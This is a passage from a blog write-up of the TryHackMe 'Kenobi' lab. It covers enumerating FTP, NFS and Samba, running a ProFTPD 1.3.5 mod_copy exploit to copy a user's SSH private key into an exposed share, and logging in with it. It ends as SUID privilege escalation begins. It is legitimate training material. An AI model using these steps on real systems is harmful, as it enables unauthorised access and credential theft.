                          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20a8 8 0 0 0 8-8 8 8 0 0 0-8-8 8 8 0 0 0-8 8 8 8 0 0 0 8 8m0-18a10 10 0 0 1 10 10 10 10 0 0 1-10 10C6.47 22 2 17.5 2 12A10 10 0 0 1 12 2m.5 5v5.25l4.5 2.67-.75 1.23L11 13V7z"/></svg>
                          <span class="md-ellipsis">
                            
                              11 min read
                            
                          </span>
                        </div>
                      </li>
                    
                  </ul>
                </nav>
              </li>
            </ul>
            
          </nav>
          
        </div>
      </div>
    </div>
    <article class="md-content__inner md-typeset">
      
        
  


  <nav class="md-tags" >
    
      
      
      
        <span class="md-tag">ProFtpd</span>
      
    
      
      
      
        <span class="md-tag">path-variable-manipulation</span>
      
    
      
      
      
        <span class="md-tag">samba</span>
      
    
  </nav>


  
  


<h1 id="tryhackme-kenobi">TryHackMe: Kenobi<a class="headerlink" href="#tryhackme-kenobi" title="Permanent link">&para;</a></h1>
<p>Kenobi is an <strong>EASY</strong> room on <a href="https://tryhackme.com/r/room/kenobi">TryHackMe</a> that involves accessing an open Samba share, and then abusing a vulnerable version of ProFtpd to get a foothold on the machine, and then abusing a SUID binary to elevate privileges to root. </p>
<p>Please <strong>NOTE</strong>: The commands in this writeup vary slightly from the room walkthrough on THM. It's mostly down to personal preference, but with pentesting there are usually multiple ways to do something.</p>
<!-- more -->
<p><a class="glightbox" href="../../../images/tryhackme_kenobi/kenobi.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../images/tryhackme_kenobi/kenobi.png" /></a></p>
<h2 id="walkthrough">Walkthrough<a class="headerlink" href="#walkthrough" title="Permanent link">&para;</a></h2>
<h3 id="nmap-scan">Nmap Scan<a class="headerlink" href="#nmap-scan" title="Permanent link">&para;</a></h3>
<p>The initial nmap scan shows that there are five ports open, as shown below:</p>
<div class="highlight"><pre><span></span><code><span class="go">21/open/tcp/ftp/ProFTPD1.3.5</span>
<span class="go">22/open/tcp/ssh/OpenSSH7.2p2Ubuntu4ubuntu2.7(UbuntuLinux;protocol2.0)</span>
<span class="go">80/open/tcp/http/Apachehttpd2.4.18((Ubuntu))</span>
<span class="go">111/open/tcp/rpcbind/2-4(RPC#100000)</span>
<span class="go">139/open/tcp/netbios-ssn/Sambasmbd3.X-4.X(workgroup</span>
</code></pre></div>
<h3 id="service-footprinting">Service Footprinting<a class="headerlink" href="#service-footprinting" title="Permanent link">&para;</a></h3>
<h4 id="ftp-port-21">FTP - Port 21<a class="headerlink" href="#ftp-port-21" title="Permanent link">&para;</a></h4>
<p>Checking for anonymous access, it seems like anonymous access is allowed, but it's prompting for a full email as a password. Trying easy things like "anonymous", "anonymous{at}kenobi.thm", and a blank password didn't work. </p>
<div class="highlight"><pre><span></span><code><span class="gp">$ </span>ftp<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span><span class="m">21</span>

<span class="go">Connected to 10.10.68.225.</span>
<span class="go">220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.68.225]</span>
<span class="go">Name (10.10.68.225:thomas): anonymous</span>
<span class="go">331 Anonymous login ok, send your complete email address as your password</span>
<span class="go">Password:</span>
<span class="go">530 Login incorrect.</span>
<span class="go">ftp: Login failed</span>
<span class="go">ftp&gt; exit</span>
<span class="go">221 Goodbye.</span>
</code></pre></div>
<p>A later question will ask for the version number of ProFtpd running. It's in the output above, but we can also use <code>netcat</code> to grab the banner.</p>
<div class="highlight"><pre><span></span><code><span class="gp">$ </span>nc<span class="w"> </span>-nv<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span><span class="m">21</span>

<span class="go">Connection to 10.10.68.225 21 port [tcp/*] succeeded!</span>
<span class="go">220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.68.225]</span>
</code></pre></div>
<h4 id="nfs-port-111">NFS - Port 111<a class="headerlink" href="#nfs-port-111" title="Permanent link">&para;</a></h4>
<p>It looks like there's a file share exported that we may be able to look at. </p>
<div class="highlight"><pre><span></span><code><span class="gp">$ </span>showmount<span class="w"> </span>-e<span class="w"> </span><span class="nv">$ip</span>

<span class="go">Export list for 10.10.68.225:</span>
<span class="go">/var *</span>
</code></pre></div>
<p>We can mount the exported share with:</p>
<div class="highlight"><pre><span></span><code><span class="gp">$ </span>sudo<span class="w"> </span>mount<span class="w"> </span>-t<span class="w"> </span>nfs<span class="w"> </span><span class="nv">$ip</span>:/var<span class="w"> </span>var<span class="w"> </span>-o<span class="w"> </span>nolock
</code></pre></div>
<p>And then we can list the contents of the exported share.</p>
<p><a class="glightbox" href="../../../images/screenshots/Pasted%20image%2020240607125757.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../images/screenshots/Pasted%20image%2020240607125757.png" /></a></p>
<div class="highlight"><pre><span></span><code><span class="gp">$ </span>tree
<span class="go">.</span>
<span class="go">├── backups</span>
<span class="go">│   └── apt.extended_states.0</span>
<span class="go">├── cache</span>
<span class="go">│   ├── apache2</span>
<span class="go">│   │   └── mod_cache_disk</span>
<span class="go">│   ├── apparmor</span>
<span class="go">│   ├── apt</span>
<span class="go">│   │   ├── archives</span>
<span class="go">│   │   │   ├── lock</span>
<span class="go">│   │   │   └── partial  [error opening dir]</span>
<span class="go">│   │   ├── pkgcache.bin</span>
<span class="go">│   │   └── srcpkgcache.bin</span>
<span class="go">│   ├── debconf</span>
<span class="go">│   │   ├── config.dat</span>
<span class="go">│   │   ├── config.dat-old</span>
<span class="go">│   │   ├── passwords.dat</span>
<span class="go">│   │   ├── templates.dat</span>
<span class="go">│   │   └── templates.dat-old</span>
<span class="go">│   ├── ldconfig  [error opening dir]</span>
<span class="go">│   ├── samba</span>
<span class="go">│   │   ├── browse.dat</span>
<span class="go">│   │   ├── gencache.tdb</span>
<span class="go">│   │   └── printing</span>
<span class="go">│   │       └── printers.tdb</span>
<span class="go">│   └── snapd</span>
<span class="go">│       ├── commands.db</span>
<span class="go">│       ├── names</span>
<span class="go">│       └── sections</span>
<span class="go">├── crash</span>
<span class="go">├── lib</span>
<span class="go">│   ├── apache2</span>
<span class="go">│   │   ├── conf</span>
<span class="go">│   │   │   └── enabled_by_maint</span>
<span class="go">│   │   │       ├── charset</span>
<span class="go">│   │   │       ├── localized-error-pages</span>
<span class="go">│   │   │       ├── other-vhosts-access-log</span>
<span class="go">│   │   │       ├── security</span>
<span class="go">│   │   │       └── serve-cgi-bin</span>
<span class="go">│   │   ├── module</span>
<span class="go">│   │   │   └── enabled_by_maint</span>
<span class="go">│   │   │       ├── access_compat</span>
<span class="go">│   │   │       ├── alias</span>
<span class="go">│   │   │       ├── auth_basic</span>
<span class="go">│   │   │       ├── authn_core</span>
<span class="go">│   │   │       ├── authn_file</span>
<span class="go">│   │   │       ├── authz_core</span>
<span class="go">│   │   │       ├── authz_host</span>
<span class="go">│   │   │       ├── authz_user</span>
<span class="go">│   │   │       ├── autoindex</span>
<span class="go">│   │   │       ├── deflate</span>
<span class="go">│   │   │       ├── dir</span>
<span class="go">│   │   │       ├── env</span>
<span class="go">│   │   │       ├── filter</span>
<span class="go">│   │   │       ├── mime</span>
<span class="go">│   │   │       ├── mpm_event</span>
<span class="go">│   │   │       ├── negotiation</span>
<span class="go">│   │   │       ├── setenvif</span>
<span class="go">│   │   │       └── status</span>
<span class="go">│   │   └── site</span>
<span class="go">│   │       └── enabled_by_admin</span>
<span class="go">│   │           └── 000-default</span>
<span class="go">│   ├── apparmor</span>
<span class="go">│   │   └── profiles</span>
<span class="go">│   ├── apt</span>
<span class="go">│   │   ├── cdroms.list</span>
<span class="go">│   │   ├── cdroms.list~</span>
<span class="go">│   │   ├── daily_lock</span>
<span class="go">│   │   ├── extended_states</span>
<span class="go">│   │   ├── keyrings</span>
<span class="go">│   │   │   └── ubuntu-archive-keyring.gpg</span>
<span class="go">│   │   ├── lists</span>
<span class="go">│   │   │   ├── lock</span>
<span class="go">│   │   │   ├── partial  [error opening dir]</span>
<span class="go">│   │   │   ├── security.ubuntu.com_ubuntu_dists_xenial-security_InRelease</span>
<span class="go">│   │   │   ├── security.ubuntu.com_ubuntu_dists_xenial-security_main_binary-amd64_Packages</span>
<span class="go">│   │   │   ├── security.ubuntu.com_ubuntu_dists_xenial-security_main_binary-i386_Packages</span>
<span class="go">│   │   │   ├── security.ubuntu.com_ubuntu_dists_xenial-security_main_i18n_Translation-en</span>
<span class="go">│   │   │   ├── security.ubuntu.com_ubuntu_dists_xenial-security_multiverse_binary-amd64_Packages</span>
<span class="go">│   │   │   ├── security.ubuntu.com_ubuntu_dists_xenial-security_multiverse_binary-i386_Packages</span>
<span class="go">│   │   │   ├── security.ubuntu.com_ubuntu_dists_xenial-security_multiverse_i18n_Translation-en</span>
<span class="go">│   │   │   ├── security.ubuntu.com_ubuntu_dists_xenial-security_restricted_binary-amd64_Packages</span>
<span class="go">│   │   │   ├── security.ubuntu.com_ubuntu_dists_xenial-security_restricted_binary-i386_Packages</span>
<span class="go">│   │   │   ├── security.ubuntu.com_ubuntu_dists_xenial-security_restricted_i18n_Translation-en</span>
<span class="go">│   │   │   ├── security.ubuntu.com_ubuntu_dists_xenial-security_universe_binary-amd64_Packages</span>
<span class="go">│   │   │   ├── security.ubuntu.com_ubuntu_dists_xenial-security_universe_binary-i386_Packages</span>
<span class="go">│   │   │   ├── security.ubuntu.com_ubuntu_dists_xenial-security_universe_i18n_Translation-en</span>
<span class="go">│   │   │   ├── Ubuntu-Server%2016.04.6%20LTS%20%5fXenial%20Xerus%5f%20-%20Release%20amd64%20(20190226)_dists_xenial_main_binary-amd64_Packages</span>
<span class="go">│   │   │   ├── Ubuntu-Server%2016.04.6%20LTS%20%5fXenial%20Xerus%5f%20-%20Release%20amd64%20(20190226)_dists_xenial_Release</span>
<span class="go">│   │   │   ├── Ubuntu-Server%2016.04.6%20LTS%20%5fXenial%20Xerus%5f%20-%20Release%20amd64%20(20190226)_dists_xenial_Release.gpg</span>
<span class="go">│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial-backports_InRelease</span>
<span class="go">│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial-backports_main_binary-amd64_Packages</span>
<span class="go">│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial-backports_main_binary-i386_Packages</span>
<span class="go">│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial-backports_main_i18n_Translation-en</span>
<span class="go">│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial-backports_universe_binary-amd64_Packages</span>
<span class="go">│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial-backports_universe_binary-i386_Packages</span>
<span class="go">│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial-backports_universe_i18n_Translation-en</span>
<span class="go">│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial_InRelease</span>
<span class="go">│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial_main_binary-amd64_Packages</span>
<span class="go">│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial_main_binary-i386_Packages</span>
<span class="go">│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial_main_i18n_Translation-en</span>
<span class="go">│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial_multiverse_binary-amd64_Packages</span>
<span class="go">│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial_multiverse_binary-i386_Packages</span>
<span class="go">│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial_multiverse_i18n_Translation-en</span>
<span class="go">│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial_restricted_binary-amd64_Packages</span>
<span class="go">│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial_restricted_binary-i386_Packages</span>
<span class="go">│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial_restricted_i18n_Translation-en</span>
<span class="go">│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial_universe_binary-amd64_Packages</span>
<span class="go">│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial_universe_binary-i386_Packages</span>
<span class="go">│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial_universe_i18n_Translation-en</span>
<span class="go">│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial-updates_InRelease</span>
<span class="go">│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial-updates_main_binary-amd64_Packages</span>
<span class="go">│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial-updates_main_binary-i386_Packages</span>
<span class="go">│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial-updates_main_i18n_Translation-en</span>
<span class="go">│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial-updates_multiverse_binary-amd64_Packages</span>
<span class="go">│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial-updates_multiverse_binary-i386_Packages</span>
<span class="go">│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial-updates_multiverse_i18n_Translation-en</span>
<span class="go">│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial-updates_restricted_binary-amd64_Packages</span>
<span class="go">│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial-updates_restricted_binary-i386_Packages</span>
<span class="go">│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial-updates_restricted_i18n_Translation-en</span>
<span class="go">│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial-updates_universe_binary-amd64_Packages</span>
<span class="go">│   │   │   ├── us.archive.ubuntu.com_ubuntu_dists_xenial-updates_universe_binary-i386_Packages</span>
<span class="go">│   │   │   └── us.archive.ubuntu.com_ubuntu_dists_xenial-updates_universe_i18n_Translation-en</span>
<span class="go">│   │   ├── mirrors</span>
<span class="go">│   │   │   └── partial</span>
<span class="go">│   │   └── periodic</span>
<span class="go">│   │       └── update-stamp</span>
<span class="go">│   ├── dbus</span>
<span class="go">│   │   └── machine-id</span>
<span class="go">│   ├── dhcp</span>
<span class="go">│   │   ├── dhclient.enp0s3.leases</span>
<span class="go">│   │   └── dhclient.eth0.leases</span>
<span class="go">│   ├── dpkg</span>
<span class="go">│   │   ├── alternatives</span>
<span class="go">│   │   │   ├── awk</span>
<span class="go">│   │   │   ├── builtins.7.gz</span>
<span class="go">│   │   │   ├── c89</span>
<span class="go">│   │   │   ├── c99</span>
<span class="go">│   │   │   ├── cc</span>
<span class="go">│   │   │   ├── cpp</span>
<span class="go">│   │   │   ├── editor</span>

<span class="go">[...SNIP...]</span>

<span class="go">│   ├── ureadahead</span>
<span class="go">│   │   └── debugfs</span>
<span class="go">│   ├── usbutils</span>
<span class="go">│   │   └── usb.ids</span>
<span class="go">│   ├── vim</span>
<span class="go">│   │   └── addons</span>
<span class="go">│   └── xml-core</span>
<span class="go">│       ├── catalog</span>
<span class="go">│       └── xml-core</span>
<span class="go">├── local</span>
<span class="go">├── lock -&gt; /run/lock</span>
<span class="go">├── log</span>
<span class="go">│   ├── alternatives.log</span>
<span class="go">│   ├── apache2</span>
<span class="go">│   │   ├── access.log</span>
<span class="go">│   │   ├── error.log</span>
<span class="go">│   │   └── other_vhosts_access.log</span>
<span class="go">│   ├── apt</span>
<span class="go">│   │   ├── history.log</span>
<span class="go">│   │   └── term.log</span>
<span class="go">│   ├── auth.log</span>
<span class="go">│   ├── bootstrap.log</span>
<span class="go">│   ├── btmp</span>
<span class="go">│   ├── dist-upgrade</span>
<span class="go">│   ├── dmesg</span>
<span class="go">│   ├── dpkg.log</span>
<span class="go">│   ├── faillog</span>
<span class="go">│   ├── fsck</span>
<span class="go">│   │   ├── checkfs</span>
<span class="go">│   │   └── checkroot</span>
<span class="go">│   ├── installer</span>
<span class="go">│   │   ├── cdebconf</span>
<span class="go">│   │   │   ├── questions.dat</span>
<span class="go">│   │   │   └── templates.dat</span>
<span class="go">│   │   ├── hardware-summary</span>
<span class="go">│   │   ├── initial-status.gz</span>
<span class="go">│   │   ├── lsb-release</span>
<span class="go">│   │   ├── media-info</span>
<span class="go">│   │   ├── partman</span>
<span class="go">│   │   ├── status</span>
<span class="go">│   │   └── syslog</span>
<span class="go">│   ├── kern.log</span>
<span class="go">│   ├── lastlog</span>
<span class="go">│   ├── lxd</span>
<span class="go">│   ├── samba</span>
<span class="go">│   │   ├── cores  [error opening dir]</span>
<span class="go">│   │   ├── log.</span>
<span class="go">│   │   ├── log.10.2.113.252</span>
<span class="go">│   │   ├── log.192.168.1.147</span>
<span class="go">│   │   ├── log.netwars</span>
<span class="go">│   │   ├── log.nmap</span>
<span class="go">│   │   ├── log.nmbd</span>
<span class="go">│   │   └── log.smbd</span>
<span class="go">│   ├── syslog</span>
<span class="go">│   ├── unattended-upgrades</span>
<span class="go">│   │   └── unattended-upgrades-shutdown.log</span>
<span class="go">│   └── wtmp</span>
<span class="go">├── mail</span>
<span class="go">├── opt</span>
<span class="go">├── run -&gt; /run</span>
<span class="go">├── snap</span>
<span class="go">├── spool</span>
<span class="go">│   ├── cron</span>
<span class="go">│   │   ├── atjobs  [error opening dir]</span>
<span class="go">│   │   ├── atspool  [error opening dir]</span>
<span class="go">│   │   └── crontabs  [error opening dir]</span>
<span class="go">│   ├── mail -&gt; ../mail</span>
<span class="go">│   ├── rsyslog  [error opening dir]</span>
<span class="go">│   └── samba</span>
<span class="go">├── tmp</span>
<span class="go">│   ├── systemd-private-2408059707bc41329243d2fc9e613f1e-systemd-timesyncd.service-a5PktM  [error opening dir]</span>
<span class="go">│   ├── systemd-private-6f4acd341c0b40569c92cee906c3edc9-systemd-timesyncd.service-z5o4Aw  [error opening dir]</span>
<span class="go">│   ├── systemd-private-818a59a15eb94a49bfd3f3793a9f2233-systemd-timesyncd.service-yD1FDa  [error opening dir]</span>
<span class="go">│   └── systemd-private-e69bbb0653ce4ee3bd9ae0d93d2a5806-systemd-timesyncd.service-zObUdn  [error opening dir]</span>
<span class="go">└── www</span>
<span class="go">    └── html</span>
<span class="go">        ├── admin.html</span>
<span class="go">        ├── image.gif</span>
<span class="go">        ├── image.jpg</span>
<span class="go">        ├── index.html</span>
<span class="go">        └── robots.txt</span>

<span class="go">166 directories, 2456 files</span>
</code></pre></div>
<p>Looking at <code>/var/log/auth.log</code> we can see there's a user called <code>kenobi</code> (SHOCKER!!) with the home directory <code>/home/kenobi</code>. There's not really anything to do with that for now though.</p>
<p>After looking over this briefly, it doesn't seem like there's anything SUPER juicy there, so we'll keep this in the cargo pocket and move on for now. </p>
<h4 id="samba-port-139">SAMBA - Port 139<a class="headerlink" href="#samba-port-139" title="Permanent link">&para;</a></h4>
<p>Using netexec, we can enumerate accessible shares on the server.</p>
<div class="highlight"><pre><span></span><code><span class="gp">$ </span>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--shares

<span class="go">SMB         10.10.68.225    445    KENOBI           [*] Windows 6.1 (name:KENOBI) (domain:) (signing:False) (SMBv1:True)</span>
<span class="go">SMB         10.10.68.225    445    KENOBI           [+] \:</span>
<span class="go">SMB         10.10.68.225    445    KENOBI           [*] Enumerated shares</span>
<span class="go">SMB         10.10.68.225    445    KENOBI           Share           Permissions     Remark</span>
<span class="go">SMB         10.10.68.225    445    KENOBI           -----           -----------     ------</span>
<span class="go">SMB         10.10.68.225    445    KENOBI           print$                          Printer Drivers</span>
<span class="go">SMB         10.10.68.225    445    KENOBI           anonymous       READ</span>
<span class="go">SMB         10.10.68.225    445    KENOBI           IPC$                            IPC Service (kenobi server (Samba, Ubuntu))</span>
</code></pre></div>
<p>Note that we have anonymous access to the <code>anonymous</code> share. </p>
<p>Using <code>smbclient.py</code> from Impacket, we an enumerate the share. Seems like there's one file present, called <code>log.txt</code>. </p>
<div class="highlight"><pre><span></span><code><span class="gp">$ </span>smbclient.py<span class="w"> </span>anonymous:anonymous@<span class="nv">$ip</span>

<span class="go">Impacket v0.12.0.dev1+20240523.75507.15eff880 - Copyright 2023 Fortra</span>

<span class="go">Type help for list of commands</span>

<span class="gp"># </span>shares
<span class="go">print$</span>
<span class="go">anonymous</span>
<span class="go">IPC$</span>

<span class="gp"># </span>use<span class="w"> </span>anonymous
<span class="gp"># </span>ls<span class="w"> </span>-la
<span class="go">[-] SMB SessionError: code: 0xc000000f - STATUS_NO_SUCH_FILE - {File Not Found} The file %hs does not exist.</span>
<span class="gp"># </span>ls
<span class="go">drw-rw-rw-          0  Wed Sep  4 05:49:09 2019 .</span>
<span class="go">drw-rw-rw-          0  Wed Sep  4 05:56:07 2019 ..</span>
<span class="go">-rw-rw-rw-      12237  Wed Sep  4 05:49:09 2019 log.txt</span>

<span class="gp"># </span>cat<span class="w"> </span>log.txt
<span class="go">Generating public/private rsa key pair.</span>
<span class="go">Enter file in which to save the key (/home/kenobi/.ssh/id_rsa):</span>
<span class="go">Created directory &#39;/home/kenobi/.ssh&#39;.</span>
<span class="go">Enter passphrase (empty for no passphrase):</span>
<span class="go">Enter same passphrase again:</span>
<span class="go">Your identification has been saved in /home/kenobi/.ssh/id_rsa.</span>
<span class="go">Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.</span>
<span class="go">The key fingerprint is:</span>
<span class="go">SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi</span>
<span class="go">The key&#39;s randomart image is:</span>
<span class="go">+---[RSA 2048]----+</span>
<span class="go">|                 |</span>
<span class="go">|           ..    |</span>
<span class="go">|        . o. .   |</span>
<span class="go">|       ..=o +.   |</span>
<span class="go">|      . So.o++o. |</span>
<span class="go">|  o ...+oo.Bo*o  |</span>
<span class="go">| o o ..o.o+.@oo  |</span>
<span class="go">|  . . . E .O+= . |</span>
<span class="go">|     . .   oBo.  |</span>
<span class="go">+----[SHA256]-----+</span>

<span class="gp"># </span>This<span class="w"> </span>is<span class="w"> </span>a<span class="w"> </span>basic<span class="w"> </span>ProFTPD<span class="w"> </span>configuration<span class="w"> </span>file<span class="w"> </span><span class="o">(</span>rename<span class="w"> </span>it<span class="w"> </span>to
<span class="gp"># </span><span class="s1">&#39;proftpd.conf&#39;</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>actual<span class="w"> </span>use.<span class="w">  </span>It<span class="w"> </span>establishes<span class="w"> </span>a<span class="w"> </span>single<span class="w"> </span>server
<span class="gp"># </span>and<span class="w"> </span>a<span class="w"> </span>single<span class="w"> </span>anonymous<span class="w"> </span>login.<span class="w">  </span>It<span class="w"> </span>assumes<span class="w"> </span>that<span class="w"> </span>you<span class="w"> </span>have<span class="w"> </span>a<span class="w"> </span>user/group
<span class="gp"># </span><span class="s2">&quot;nobody&quot;</span><span class="w"> </span>and<span class="w"> </span><span class="s2">&quot;ftp&quot;</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>normal<span class="w"> </span>operation<span class="w"> </span>and<span class="w"> </span>anon.

<span class="go">ServerName                      &quot;ProFTPD Default Installation&quot;</span>
<span class="go">ServerType                      standalone</span>
<span class="go">DefaultServer                   on</span>

<span class="gp"># </span>Port<span class="w"> </span><span class="m">21</span><span class="w"> </span>is<span class="w"> </span>the<span class="w"> </span>standard<span class="w"> </span>FTP<span class="w"> </span>port.
<span class="go">Port                            21</span>

<span class="gp"># </span>Don<span class="err">&#39;</span>t<span class="w"> </span>use<span class="w"> </span>IPv6<span class="w"> </span>support<span class="w"> </span>by<span class="w"> </span>default.
<span class="go">UseIPv6                         off</span>

<span class="gp"># </span>Umask<span class="w"> </span><span class="m">022</span><span class="w"> </span>is<span class="w"> </span>a<span class="w"> </span>good<span class="w"> </span>standard<span class="w"> </span><span class="nb">umask</span><span class="w"> </span>to<span class="w"> </span>prevent<span class="w"> </span>new<span class="w"> </span><span class="nb">dirs</span><span class="w"> </span>and<span class="w"> </span>files
<span class="gp"># </span>from<span class="w"> </span>being<span class="w"> </span>group<span class="w"> </span>and<span class="w"> </span>world<span class="w"> </span>writable.
<span class="go">Umask                           022</span>

<span class="gp"># </span>To<span class="w"> </span>prevent<span class="w"> </span>DoS<span class="w"> </span>attacks,<span class="w"> </span><span class="nb">set</span><span class="w"> </span>the<span class="w"> </span>maximum<span class="w"> </span>number<span class="w"> </span>of<span class="w"> </span>child<span class="w"> </span>processes
<span class="gp"># </span>to<span class="w"> </span><span class="m">30</span>.<span class="w">  </span>If<span class="w"> </span>you<span class="w"> </span>need<span class="w"> </span>to<span class="w"> </span>allow<span class="w"> </span>more<span class="w"> </span>than<span class="w"> </span><span class="m">30</span><span class="w"> </span>concurrent<span class="w"> </span>connections
<span class="gp"># </span>at<span class="w"> </span>once,<span class="w"> </span>simply<span class="w"> </span>increase<span class="w"> </span>this<span class="w"> </span>value.<span class="w">  </span>Note<span class="w"> </span>that<span class="w"> </span>this<span class="w"> </span>ONLY<span class="w"> </span>works
<span class="gp"># </span><span class="k">in</span><span class="w"> </span>standalone<span class="w"> </span>mode,<span class="w"> </span><span class="k">in</span><span class="w"> </span>inetd<span class="w"> </span>mode<span class="w"> </span>you<span class="w"> </span>should<span class="w"> </span>use<span class="w"> </span>an<span class="w"> </span>inetd<span class="w"> </span>server
<span class="gp"># </span>that<span class="w"> </span>allows<span class="w"> </span>you<span class="w"> </span>to<span class="w"> </span>limit<span class="w"> </span>maximum<span class="w"> </span>number<span class="w"> </span>of<span class="w"> </span>processes<span class="w"> </span>per<span class="w"> </span>service
<span class="gp"># </span><span class="o">(</span>such<span class="w"> </span>as<span class="w"> </span>xinetd<span class="o">)</span>.
<span class="go">MaxInstances                    30</span>

<span class="go">[...SNIP...]</span>
</code></pre></div>
<h3 id="initial-access">Initial Access<a class="headerlink" href="#initial-access" title="Permanent link">&para;</a></h3>
<p>Checking exploit-db for exploits related to the ProFtpd version we identified, we see that there are 4 exploits found. </p>
<p><a class="glightbox" href="../../../images/screenshots/Pasted%20image%2020240607133035.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../images/screenshots/Pasted%20image%2020240607133035.png" /></a></p>
<p>I'm going to grab the exploit 49908 using </p>
<div class="highlight"><pre><span></span><code><span class="gp">$ </span>searchsploit<span class="w"> </span>-m<span class="w"> </span><span class="m">49908</span>
</code></pre></div>
<p>After modifying the exploit slightly, I was able to copy the <code>id_rsa</code> key from the <code>kenobi</code> user's home directory into the <code>/var/tmp/</code> directory so I'm able to access it though the share I mounted earlier. </p>
<div class="highlight"><pre><span></span><code><span class="gp">$ </span>python3<span class="w"> </span><span class="m">49908</span>.py<span class="w"> </span><span class="m">10</span>.10.68.225

<span class="go">220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.68.225]</span>

<span class="go">350 File or directory exists, ready for destination name</span>

<span class="go">250 Copy successful</span>

<span class="go">350 File or directory exists, ready for destination name</span>

<span class="go">550 cpto: Permission denied</span>

<span class="go">Exploit Completed</span>
<span class="go">[!] Something Went Wrong</span>
<span class="go">[!] Directory might not be writable</span>
</code></pre></div>
<p>After running the exploit, we can see that the key is now in the <code>/var/tmp</code> directory.</p>
<p><a class="glightbox" href="../../../images/screenshots/Pasted%20image%2020240607134152.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../images/screenshots/Pasted%20image%2020240607134152.png" /></a></p>
<p>After changing the permissions on the key to 600 (<code>chmod 600 &lt;KEY&gt;</code>) we're able to ssh into the box as the <code>kenobi</code> user. </p>
<div class="highlight"><pre><span></span><code><span class="gp">$ </span>ssh<span class="w"> </span>-i<span class="w"> </span>kenobi<span class="w"> </span>kenobi@<span class="nv">$ip</span>

<span class="go">The authenticity of host &#39;10.10.68.225 (10.10.68.225)&#39; can&#39;t be established.</span>
<span class="go">ED25519 key fingerprint is SHA256:GXu1mgqL0Wk2ZHPmEUVIS0hvusx4hk33iTcwNKPktFw.</span>
<span class="go">This key is not known by any other names.</span>
<span class="go">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span>
<span class="go">Warning: Permanently added &#39;10.10.68.225&#39; (ED25519) to the list of known hosts.</span>
<span class="go">Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)</span>

<span class="go"> * Documentation:  https://help.ubuntu.com</span>
<span class="go"> * Management:     https://landscape.canonical.com</span>
<span class="go"> * Support:        https://ubuntu.com/advantage</span>

<span class="go">103 packages can be updated.</span>
<span class="go">65 updates are security updates.</span>


<span class="go">Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147</span>
<span class="go">To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.</span>
<span class="go">See &quot;man sudo_root&quot; for details.</span>

<span class="gp">kenobi@kenobi:~$</span>
</code></pre></div>
<h3 id="privilege-escalation">Privilege Escalation<a class="headerlink" href="#privilege-escalation" title="Permanent link">&para;</a></h3>
<p>We can list SUID binaries with the following command:</p>
<div class="highlight"><pre><span></span><code><span class="gp">$ </span>find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-u<span class="o">=</span>s<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null
</code></pre></div>
<p>One stands out as odd.</p>
<p><a class="glightbox" href="../../../images/screenshots/Pasted%20image%2020240607134737.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../images/screenshots/Pasted%20image%2020240607134737.png" /></a></p>
<p>Running that binary, we're presented with three options. </p>
